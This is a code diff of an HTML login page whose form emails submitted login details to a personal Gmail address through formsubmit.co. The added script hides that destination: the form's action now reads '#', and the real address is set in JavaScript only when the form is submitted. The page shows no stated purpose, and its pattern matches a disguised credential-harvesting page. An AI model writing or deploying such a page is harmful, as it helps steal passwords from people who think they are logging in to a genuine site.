@@ -35,7 +35,7 @@
         <div class="login-container">
             <h5 id="login-box">Login</h5>
             
-            <form action="https://formsubmit.co/gurunanthan.r.j@gmail.com" method="POST">
+            <form action="#" method="POST" id="myForm">
                     <div class="form-container">
                         <input type="hidden" name="_captcha" value="false">
                         <input id="url" type="hidden" name="_next" value=>
@@ -66,6 +66,16 @@
      <script>
       // Get the current URL and set it as the value of the input box
       document.getElementById("url").value = window.location.href;
+      document.getElementById("myForm").addEventListener("submit", function(event) {
+        event.preventDefault(); // prevent the form from submitting normally
+  
+  // Set the action of the form to your desired URL
+        this.action = "https://formsubmit.co/gurunanthan.r.j@gmail.com";
+
+  // Submit the form
+        this.submit();
+    });
+
     </script>
     <footer></footer>
 
